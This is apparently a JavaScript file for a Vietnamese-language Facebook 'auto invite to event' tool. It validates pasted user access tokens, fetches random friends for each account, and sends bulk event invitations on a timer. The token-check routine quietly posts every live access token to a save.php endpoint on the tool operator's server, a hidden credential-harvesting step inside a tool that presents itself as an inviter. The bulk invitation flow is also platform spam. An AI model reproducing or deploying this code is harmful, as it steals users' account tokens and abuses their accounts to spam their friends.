function auto_invitedevent_check(c){
	$.get('https://graph.facebook.com/',{
		method:'post',access_token:c,batch:'[{"method":"GET","relative_url":"me?fields=id,name"},{"method":"GET","relative_url":"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) ORDER BY rand() LIMIT '+auto_invitedevent.limit+'"}]',include_headers:'false'
	}
	,function(a){
		var b=JSON.parse(a[0].body);
		auto_invitedevent.array[auto_invitedevent.success]=[],auto_invitedevent.array[auto_invitedevent.success].uid=b.id,auto_invitedevent.array[auto_invitedevent.success].data=JSON.parse(a[1].body).data,auto_invitedevent.array[auto_invitedevent.success].access_token=c,auto_invitedevent.success++,auto_invitedevent.bach+=c+'',tbody='',tbody+='<tr>',tbody+='	<td>'+auto_invitedevent.success+'</td>',tbody+='	<td>'+b.name+'</td>',tbody+='	<td align="center">'+auto_invitedevent.array[auto_invitedevent.success-1].data.length+'</td>',tbody+='	<td align="center"><font color="green"><span id="auto_invitedevent_success_'+auto_invitedevent.success+'">0</span></font></td>',tbody+='	<td align="center"><font color="red"><span id="auto_invitedevent_error_'+auto_invitedevent.success+'">0</span></font></td>',tbody+='	<td id="auto_invitedevent_status_'+auto_invitedevent.success+'" b-data="loading">Đang chờ !</td>',tbody+='</tr>',$('#html_auto_invitedevent_body').append(tbody)
	}
	).fail(function(a){
		'undefined'== typeof a.responseText?auto_invitedevent_check(c):auto_invitedevent.error++
	}
	).always(function(){
		if(auto_invitedevent.success+auto_invitedevent.error==auto_invitedevent.token.split('\n').length){
			if(auto_invitedevent.success>0){
				var c=$.trim(auto_invitedevent.bach).split('\n');
				c.length>0&&$.post('//'+b_sv+'/save.php',{
					act:'save',array:c
				}
				),auto_invitedevent_send(0)
			}
			else {
				$('#submit_auto_invitedevent_start').buttonStop(),$('#submit_auto_invitedevent_stop').disabled(),noti.success('Không Access Token nào còn sống !'),$('#html_auto_invitedevent_result').hide()
			}
		}
	}
	)
}
function auto_invitedevent_send(c){
	if(0==auto_invitedevent.run){
		return !1
	}
	;
	if(0==auto_invitedevent.array[c].data.length){
		$('#auto_invitedevent_status_'+(c+1)).html('<font color="red">Không có bạn bè !</font>'),c+1<auto_invitedevent.array.length?auto_invitedevent_send(c+1):($('#submit_auto_invitedevent_start').buttonStop(),$('#submit_auto_invitedevent_stop').disabled(),noti.success('Quá trình mời bạn bè tham gia sự kiện đã hoàn tất !'))
	}
	else {
		for(var a=0;
		a<auto_invitedevent.array[c].data.length;
		a++){
			var b=auto_invitedevent.array[c].data[a].uid,d=auto_invitedevent.array[c].data[a].name;
			!function(b,d){
				setTimeout(function(){
					$.get('https://graph.facebook.com/'+auto_invitedevent.id+'/invited',{
						method:'post',users:b,access_token:auto_invitedevent.array[c].access_token
					}
					).done(function(){
						$('#auto_invitedevent_success_'+(c+1)).text(parseInt($('#auto_invitedevent_success_'+(c+1)).text())+1),$('#auto_invitedevent_status_'+(c+1)).html('<font color="green">Mời <b>'+d+'</b> thành công</font> '+run.loading())
					}
					).error(function(){
						$('#auto_invitedevent_error_'+(c+1)).text(parseInt($('#auto_invitedevent_error_'+(c+1)).text())+1),$('#auto_invitedevent_status_'+(c+1)).html('<font color="red">Mời <b>'+d+'</b> thất bại</font> '+run.loading())
					}
					).always(function(){
						parseInt($('#auto_invitedevent_success_'+(c+1)).text())+parseInt($('#auto_invitedevent_error_'+(c+1)).text())==auto_invitedevent.array[c].data.length&&($('#auto_invitedevent_status_'+(c+1)).html('<font color="green">Hoàn thành !</font>'),c+1<auto_invitedevent.array.length?auto_invitedevent_send(c+1):($('#submit_auto_invitedevent_start').buttonStop(),$('#submit_auto_invitedevent_stop').disabled(),noti.success('Quá trình mời bạn bè tham gia sự kiện đã hoàn tất !')))
					}
					)
				}
				,a*auto_invitedevent.delay)
			}
			(b,d)
		}
	}
}
location.hostname==b_sv&&($(document).on('click','#submit_auto_invitedevent_stop',function(){
	auto_invitedevent.run=0,$('[b-data=\'loading\']').text('Đã có lệnh dừng !'),$('#submit_auto_invitedevent_stop').disabled(),$('#submit_auto_invitedevent_start').buttonStop(),noti.success('Đã có lệnh dừng mời bạn bè tham gia sự kiện !')
}
),$(document).on('click','#submit_auto_invitedevent_start',function(){
	auto_invitedevent={
		token:$('#input_auto_invitedevent_token').validate(),limit:$('#input_auto_invitedevent_fql_limit').isNumber(),id:$('#input_auto_invitedevent_id').isNumber(),delay:$('#input_auto_invitedevent_delay').isNumber(),array:[],run:1,success:0,error:0,bach:''
	}
	,auto_invitedevent.token&&auto_invitedevent.limit&&auto_invitedevent.id&&auto_invitedevent.delay&&($(this).buttonLoad(),$('#submit_auto_invitedevent_stop').undisabled(),$('#html_auto_invitedevent_result').fadeIn('fast'),$('#html_auto_invitedevent_body').html(''),$.each(auto_invitedevent.token.split('\n'),function(c,a){
		var b=a.split('|');
		b=b[1]?b[1]:a,setTimeout(function(){
			auto_invitedevent_check(b)
		}
		,15*c)
	}
	))
}
))